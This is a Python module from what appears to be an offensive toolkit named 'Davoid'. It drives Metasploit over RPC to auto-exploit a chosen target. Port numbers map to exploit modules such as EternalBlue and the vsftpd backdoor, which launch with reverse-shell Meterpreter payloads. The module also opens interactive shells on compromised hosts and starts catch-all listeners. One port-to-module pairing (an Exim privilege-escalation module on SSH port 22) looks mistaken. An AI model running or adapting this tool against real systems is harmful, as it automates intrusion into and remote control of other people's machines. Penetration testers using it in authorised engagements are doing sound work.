import os
import sys
import time
import subprocess
import socket
import string
import random
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.context import ctx
from core.database import db

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    pass

console = Console()


class MetasploitRPCEngine:
    def __init__(self):
        self.client = None
        self.daemon_process = None
        self.password = ''.join(random.choices(
            string.ascii_letters + string.digits, k=16))
        self.rpc_port = 55554
        self.msfrpcd_path = self.find_msfrpcd()

    def find_msfrpcd(self):
        """Locates the msfrpcd executable on the system, bypassing sudo PATH issues."""
        common_paths = [
            "/opt/metasploit-framework/bin/msfrpcd",  # Official installer
            "/opt/homebrew/bin/msfrpcd",              # Apple Silicon Mac
            "/usr/local/bin/msfrpcd",                 # Intel Mac
            "/usr/bin/msfrpcd"                        # Kali Linux default
        ]

        try:
            path = subprocess.run(
                ['which', 'msfrpcd'], capture_output=True, text=True).stdout.strip()
            if os.path.exists(path):
                return path
        except:
            pass

        for p in common_paths:
            if os.path.exists(p):
                return p

        return None

    def check_dependencies(self):
        try:
            import pymetasploit3
        except ImportError:
            console.print(
                "[bold red][!] Critical Dependency Missing: 'pymetasploit3'[/bold red]")
            return False

        if not self.msfrpcd_path:
            console.print(
                "[bold red][!] Metasploit Framework ('msfrpcd') not found on this system![/bold red]")
            console.print(
                "[yellow]Please ensure Metasploit is installed and accessible.[/yellow]")
            return False

        return True

    def is_port_open(self, port):
        """Checks if a local port is listening."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('127.0.0.1', port)) == 0

    def kill_stuck_daemon(self):
        """Cross-platform method to forcefully free the RPC port."""
        if sys.platform == "darwin":  # macOS
            os.system(
                f"lsof -ti:{self.rpc_port} | xargs kill -9 > /dev/null 2>&1")
        else:  # Linux
            os.system(f"fuser -k {self.rpc_port}/tcp > /dev/null 2>&1")

    def start_daemon(self):
        """Silently boots the Metasploit RPC server in the background."""
        if self.is_port_open(self.rpc_port):
            self.kill_stuck_daemon()
            time.sleep(1)

        with console.status("[bold cyan]Booting Headless Metasploit Engine (This takes ~10-15 seconds)...[/bold cyan]", spinner="bouncingBar"):
            cmd = [self.msfrpcd_path, "-P", self.password, "-n",
                   "-f", "-a", "127.0.0.1", "-p", str(self.rpc_port)]
            self.daemon_process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Wait for the daemon to finish initializing and load its massive Ruby framework
            for _ in range(40):
                if self.is_port_open(self.rpc_port):
                    # Give it a 3-second buffer to finalize loading modules
                    time.sleep(3)
                    return True
                time.sleep(1)

        return False

    def connect_rpc(self):
        """Connects Davoid to the newly spawned MSF Daemon."""
        if self.client:
            return True

        if not self.start_daemon():
            console.print(
                "[bold red][!] Failed to boot Metasploit Daemon. Ensure Metasploit is installed correctly.[/bold red]")
            return False

        console.print("[*] Negotiating API connection...")
        try:
            self.client = MsfRpcClient(
                self.password, server='127.0.0.1', port=self.rpc_port, ssl=True)
            console.print(
                "[bold green][+] MSF-RPC Authenticated Successfully![/bold green]")
            time.sleep(1)
            return True
        except Exception as e:
            console.print(
                f"[bold red][!] RPC Connection Failed:[/bold red] {e}")
            return False

    def auto_exploit(self):
        """Silently configures and launches an exploit via API."""
        default_rhost = ctx.get("RHOST") or "192.168.1.1"
        default_lhost = ctx.get("LHOST") or "127.0.0.1"

        target = questionary.text(
            "Target IP (RHOST):", default=default_rhost, style=Q_STYLE).ask()
        if not target:
            return

        rport_input = questionary.text(
            "Target Port (RPORT):", style=Q_STYLE).ask()
        if not rport_input:
            return
        rport = int(rport_input)

        lhost = questionary.text(
            "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()

        port_exploits = {
            21: "unix/ftp/vsftpd_234_backdoor",
            22: "linux/ssh/exim_pe_injection",
            80: "multi/http/apache_normalize_path_rce",
            445: "windows/smb/ms17_010_eternalblue",
            8080: "multi/http/tomcat_mgr_upload"
        }

        module_name = port_exploits.get(rport, "multi/handler")
        custom_mod = questionary.text(
            f"Exploit Module (Default: {module_name}):", default=module_name, style=Q_STYLE).ask()
        if not custom_mod:
            return

        # Smart default payload guessing based on the module
        default_payload = "windows/x64/meterpreter/reverse_tcp"
        if "unix" in custom_mod or "linux" in custom_mod or "apache" in custom_mod:
            default_payload = "cmd/unix/interact"

        # Interactive Dropdown Menu for Payloads
        payload_choices = [
            "windows/x64/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "cmd/unix/interact",
            "php/meterpreter/reverse_tcp",
            "java/jsp_shell_reverse_tcp",
            "osx/x64/meterpreter_reverse_tcp",
            questionary.Separator(),
            "Custom (Type it manually)"
        ]

        custom_payload = questionary.select(
            "Select Payload:",
            choices=payload_choices,
            default=default_payload if default_payload in payload_choices else None,
            style=Q_STYLE
        ).ask()

        if custom_payload == "Custom (Type it manually)":
            custom_payload = questionary.text(
                "Enter exact MSF Payload path:", default=default_payload, style=Q_STYLE).ask()

        if not custom_payload:
            return

        console.print(Panel(
            f"[bold cyan]Deploying Exploit via API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}", border_style="red"))

        try:
            exploit = self.client.modules.use('exploit', custom_mod)

            # Apply options securely checking if the module requires them
            if 'RHOSTS' in exploit.options:
                exploit['RHOSTS'] = target
            elif 'RHOST' in exploit.options:
                exploit['RHOST'] = target

            if 'RPORT' in exploit.options:
                exploit['RPORT'] = rport

            # Do not force RunAsJob; let MSF decide natively so command shells hook properly.
            payload_opts = {
                'LHOST': lhost,
                'LPORT': 4444
            }

            job = exploit.execute(payload=custom_payload, **payload_opts)

            # SAFE TYPE CHECK
            if isinstance(job, dict) and job.get('job_id') is not None:
                console.print(
                    f"[bold green][+] Exploit launched successfully (Job ID: {job['job_id']})[/bold green]")
                db.log("MSF-Engine", target,
                       f"Launched {custom_mod} via RPC", "HIGH")
            elif isinstance(job, dict) and job.get('uuid'):
                console.print(
                    f"[bold green][+] Exploit executed successfully (Foreground).[/bold green]")
                db.log("MSF-Engine", target,
                       f"Launched {custom_mod} via RPC", "HIGH")
            else:
                console.print(
                    f"[yellow][+] Exploit executed, response: {job}[/yellow]")

            # Smart Wait Loop for Session Hooking (Polls every 2 seconds for 10 seconds)
            with console.status("[bold cyan]Waiting for session to establish...[/bold cyan]", spinner="bouncingBar"):
                session_found = False
                for _ in range(5):
                    time.sleep(2)
                    sessions = self.client.sessions.list
                    if sessions:
                        console.print(
                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. Use Option 3 to interact.[/bold green]")
                        session_found = True
                        break

                if not session_found:
                    console.print(
                        "\n[yellow][-] No session established yet. The target might not be vulnerable, or it needs more time.[/yellow]")

        except Exception as e:
            console.print(
                f"[bold red][!] Exploit execution failed:[/bold red] {e}")

    def list_sessions(self):
        """Pulls live session data from the Metasploit Daemon."""
        sessions = self.client.sessions.list

        if not sessions:
            console.print("[yellow][!] No active MSF sessions found.[/yellow]")
            return

        table = Table(title="Active MSF Sessions (RPC)", border_style="green")
        table.add_column("Session ID", style="cyan")
        table.add_column("Type", style="magenta")
        table.add_column("Target IP", style="white")
        table.add_column("Details", style="dim")

        for session_id, data in sessions.items():
            table.add_row(
                str(session_id),
                data.get('type', 'Unknown'),
                data.get('target_host', 'Unknown'),
                data.get('info', 'No Info')
            )

        console.print(table)

    def interact_session(self):
        """Opens an interactive terminal to an active Metasploit session."""
        sessions = self.client.sessions.list

        if not sessions:
            console.print(
                "[yellow][!] No active MSF sessions found. Exploit a target first.[/yellow]")
            return

        self.list_sessions()
        session_id = questionary.text(
            "Enter Session ID to interact with (or leave blank to cancel):", style=Q_STYLE).ask()

        if not session_id:
            return

        if session_id not in sessions:
            console.print("[bold red][!] Invalid Session ID.[/bold red]")
            return

        session_type = sessions[session_id].get('type', 'Unknown')
        shell = self.client.sessions.session(session_id)

        console.print(Panel(
            f"[bold green][+] Interacting with {session_type.capitalize()} Session {session_id}[/bold green]\n"
            f"[dim]Type 'exit', 'quit', or 'background' to return to Davoid.[/dim]",
            border_style="green"
        ))

        while True:
            try:
                cmd = questionary.text(
                    f"{session_type.capitalize()} {session_id} >", style=Q_STYLE).ask()

                if not cmd:
                    continue
                if cmd.lower() in ['exit', 'quit', 'background']:
                    break

                # Meterpreter and standard shells use different execution methods in PyMetasploit3
                if session_type == 'meterpreter':
                    output = shell.run_with_output(cmd)
                    if output:
                        console.print(f"[white]{output}[/white]")
                else:
                    shell.write(cmd + '\n')
                    time.sleep(1.5)  # Buffer time for the shell to process
                    output = shell.read()
                    if output:
                        console.print(f"[white]{output}[/white]")

            except KeyboardInterrupt:
                console.print(
                    "\n[yellow][*] Backgrounding session...[/yellow]")
                break
            except Exception as e:
                console.print(
                    f"[bold red][!] Error interacting with session:[/bold red] {e}")
                break

    def cleanup(self):
        """Kills the background daemon when leaving the module."""
        if self.daemon_process:
            console.print(
                "[dim][*] Shutting down background Metasploit Daemon...[/dim]")
            self.daemon_process.terminate()
            self.kill_stuck_daemon()  # Ensure it is completely dead

    def run(self):
        draw_header("Metasploit RPC Orchestrator")

        if not self.check_dependencies():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        if not self.connect_rpc():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        try:
            while True:
                choice = questionary.select(
                    "MSF-RPC Operations:",
                    choices=[
                        "1. Auto-Exploit Target (Background Job)",
                        "2. List Active Sessions",
                        "3. Interact with Active Session (Terminal)",
                        "4. Start Generic Catch-All Listener (Multi/Handler)",
                        "Back"
                    ], style=Q_STYLE
                ).ask()

                if not choice or choice == "Back":
                    break
                elif "Auto-Exploit" in choice:
                    self.auto_exploit()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "List Active" in choice:
                    self.list_sessions()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Interact with Active Session" in choice:
                    self.interact_session()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Listener" in choice:
                    lhost = ctx.get("LHOST") or "0.0.0.0"
                    lport = questionary.text(
                        "LPORT:", default="4444", style=Q_STYLE).ask()

                    payload_choices = [
                        "windows/x64/meterpreter/reverse_tcp",
                        "windows/meterpreter/reverse_tcp",
                        "linux/x64/meterpreter/reverse_tcp",
                        "linux/x86/meterpreter/reverse_tcp",
                        "cmd/unix/interact",
                        "php/meterpreter/reverse_tcp",
                        questionary.Separator(),
                        "Custom (Type it manually)"
                    ]

                    payload = questionary.select(
                        "Select Payload for Listener:",
                        choices=payload_choices,
                        style=Q_STYLE
                    ).ask()

                    if payload == "Custom (Type it manually)":
                        payload = questionary.text(
                            "Enter exact MSF Payload path:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()

                    if not payload:
                        continue

                    try:
                        exploit = self.client.modules.use(
                            'exploit', 'multi/handler')
                        job = exploit.execute(
                            payload=payload, LHOST=lhost, LPORT=int(lport))

                        # SAFE TYPE CHECK
                        if isinstance(job, dict) and job.get('job_id') is not None:
                            console.print(
                                f"[bold green][+] Listener started in background (Job ID: {job['job_id']})[/bold green]")
                        else:
                            console.print(
                                f"[yellow][+] Listener launched, response: {job}[/yellow]")
                    except Exception as e:
                        console.print(
                            f"[red][!] Failed to start listener: {e}[/red]")
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        finally:
            self.cleanup()


def run_msf():
    engine = MetasploitRPCEngine()
    engine.run()


if __name__ == "__main__":
    run_msf()
